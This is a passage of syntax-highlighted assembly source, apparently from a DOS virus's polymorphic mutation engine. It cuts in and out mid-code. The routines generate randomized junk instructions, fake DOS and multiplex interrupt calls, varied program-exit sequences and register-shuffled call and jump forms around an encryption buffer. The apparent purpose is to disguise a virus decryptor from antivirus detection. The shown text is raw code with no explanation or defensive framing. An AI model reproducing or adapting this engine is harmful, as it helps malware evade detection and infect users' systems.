        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">80H</span><span class="sc0">              </span><span class="sc1">;CMP REG8,IMM8</span><span class="sc0">
</span><span class="sc5">IS_CMP_WORD</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">STORE_BYTE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_JXX</span><span class="sc0">
</span><span class="sc5">NO_CMP_IMM</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0C085H</span><span class="sc0">           </span><span class="sc1">;TEST</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">STORE_OPCODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">              </span><span class="sc1">;AND</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">STORE_OPCODE</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                </span><span class="sc1">;OR</span><span class="sc0">
</span><span class="sc5">STORE_OPCODE</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc5">GET_JXX</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">              </span><span class="sc1">;ADDRESS FOR CORRECT JXX</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc1">;-------------------------------------</span><span class="sc0">
</span><span class="sc1">;GET EXIT CODE:</span><span class="sc0">
</span><span class="sc1">;1. RETN / RETN XXXX</span><span class="sc0">
</span><span class="sc1">;2. JMP(CALL) 0</span><span class="sc0">
</span><span class="sc1">;3. INT 20H</span><span class="sc0">
</span><span class="sc1">;4. MOV AX,0/INT 21H</span><span class="sc0">
</span><span class="sc1">;5. MOV AX,4CXXH/INT 21H</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_WREG</span><span class="sc4">,</span><span class="sc5">FREE_WREG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">PROC_EXIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">SIZE_PROC_EXIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">CALL_RANDOM</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GET_SHIT</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------</span><span class="sc0">
</span><span class="sc5">INT_SHIT</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">INT21_AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">FAKE_INT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">INT2F_AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">2FH</span><span class="sc0">
</span><span class="sc5">FAKE_INT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">LODSW</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_WORD_FN</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AH</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_FAKE_INT</span><span class="sc0">
</span><span class="sc5">IS_WORD_FN</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AX</span><span class="sc0">
</span><span class="sc5">GEN_FAKE_INT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_XX</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">VIA_INT20</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">20H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">INT_XX</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">MOV_WIN</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">16H</span><span class="sc0">
</span><span class="sc5">MOV_INT2F</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_AX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">2FH</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: BH - INT NUMBER</span><span class="sc0">
</span><span class="sc1">;1. 0CD,XX</span><span class="sc0">
</span><span class="sc1">;2. ZERO DS(ES)/PUSHF/CALL 4 PTR ES(DS):4*XX</span><span class="sc0">
</span><span class="sc1">;3. only for INT 21H: PUSH CS/MOV AX,50H/CALL AX</span><span class="sc0">
</span><span class="sc5">INT_XX</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc2">21H</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_DOS_SERVICE</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">CH</span><span class="sc4">,</span><span class="sc2">16H</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_DOS_SERVICE</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
</span><span class="sc5">IS_DOS_SERVICE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_BYTE</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">NO_TRIVIAL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">NO_TRIVIAL</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">DEC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">FOR_DOS_SRVC</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;1.PUSH 0(0000)/POP SEG</span><span class="sc0">
</span><span class="sc1">;2.ZERO WREG:</span><span class="sc0">
</span><span class="sc1">;  2.1 MOV SREG,WREG</span><span class="sc0">
</span><span class="sc1">;  2.2 PUSH WREG/POP SREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc5">DIRTY_SREG</span><span class="sc0">
        </span><span class="sc6">LODSB</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">FREE_SREG</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">IS_ES</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_ES</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">_DS</span><span class="sc0"> </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">IS_ES</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">VIA_WREG</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">68H</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">JP</span><span class="sc0">  </span><span class="sc5">IS_BYTE</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
</span><span class="sc5">IS_BYTE</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">POP_STACK</span><span class="sc0">
</span><span class="sc5">VIA_WREG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_ZERO16</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">UNUSED_WREG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">VIA_STACK</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">8EH</span><span class="sc0">              </span><span class="sc1">;MOV SREG,WREG</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">END_CLEAR</span><span class="sc0">       
</span><span class="sc5">VIA_STACK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc0">              </span><span class="sc1">;PUSH WREG</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
</span><span class="sc5">POP_STACK</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">;POP SREG</span><span class="sc0">
</span><span class="sc5">END_CLEAR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">9CH</span><span class="sc0">              </span><span class="sc1">;PUSHF</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">26H</span><span class="sc0">              </span><span class="sc1">;ES: (MIN)</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">1EFFH</span><span class="sc0">            </span><span class="sc1">;CALL FAR</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BH</span><span class="sc0">
        </span><span class="sc6">CBW</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">                   </span><span class="sc1">;INT ADDRESS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_SHIT</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">RESTORE_SREG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PUSH_SREG</span><span class="sc0">           </span><span class="sc1">;DIRTY_SREG=SEG NUMBER</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc5">FREE_SREG</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc0">    </span><span class="sc1">;SET DIRTY_SREG TO FREE</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">                </span><span class="sc1">;POP SREG</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">FOR_DOS_SRVC</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">50H</span><span class="sc0">
</span><span class="sc5">GEN_PUSH_CALL</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">PUSH_SREG</span><span class="sc0">
</span><span class="sc5">GEN_CALL</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;ENTRY: BL=0 FOR CALL/1 FOR JMP</span><span class="sc0">
</span><span class="sc1">;       CX=OFFSET</span><span class="sc0">
</span><span class="sc5">GEN_JMPCALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">CALL_VIA_WREG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">             </span><span class="sc1">;CALL NEAR</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc5">ENCRYPT_BUFF</span><span class="sc4">-</span><span class="sc2">100H</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">NEG</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">
</span><span class="sc5">CALL_VIA_WREG</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">AND</span><span class="sc0"> </span><span class="sc8">BL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">PUSHF</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WREG</span><span class="sc0">
        </span><span class="sc6">POPF</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc2">0D0FFH</span><span class="sc0">           </span><span class="sc1">;CALL WREG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">IS_CALL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0E0H</span><span class="sc0">             </span><span class="sc1">;JMP WREG</span><span class="sc0">
</span><span class="sc5">IS_CALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSW</span><span class="sc0">
</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">UNUSED_WREG</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_WREG</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">PSPCALL_SHIT</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">52H</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_PUSH_CALL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">VIA_JMPCALL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">GEN_JMPCALL</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">MOVREG_SHIT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_WORD</span><span class="sc0">
        </span><span class="sc6">XCHG</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">MOV_WREG</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">UNUSED_WREG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">INCDEC_SHIT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc8">DX</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">40H</span><span class="sc0">              </span><span class="sc1">;INC/DEC</span><span class="sc0">
</span><span class="sc5">SET_XCHG</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">OR</span><span class="sc0">  </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">BL</span><span class="sc0">
        </span><span class="sc6">STOSB</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">UNUSED_WREG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">XCHG_SHIT</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">START</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_FREE_REG</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">90H</span><span class="sc0">              </span><span class="sc1">;XCHG(NOP)</span><span class="sc0">
        </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">SET_XCHG</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc5">GET_VALID_SREG</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">GET_RAND_3</span><span class="sc0">
        </span><span class="sc6">INC</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">              </span><span class="sc1">;CS,SS,DS</span><span class="sc0">
        </span><span class="sc6">SHL</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc10">SMALL</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:</span><span class="sc5">DIRTY_SREG</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">  </span><span class="sc5">GET_VALID_SREG</span><span class="sc0">
        </span><span class="sc6">RETN</span><span class="sc0">

</span><span class="sc1">;--------------------------------------</span><span class="sc0">
</span><span class="sc1">;EXIT: BL=SOME WREG</span><span class="sc0">
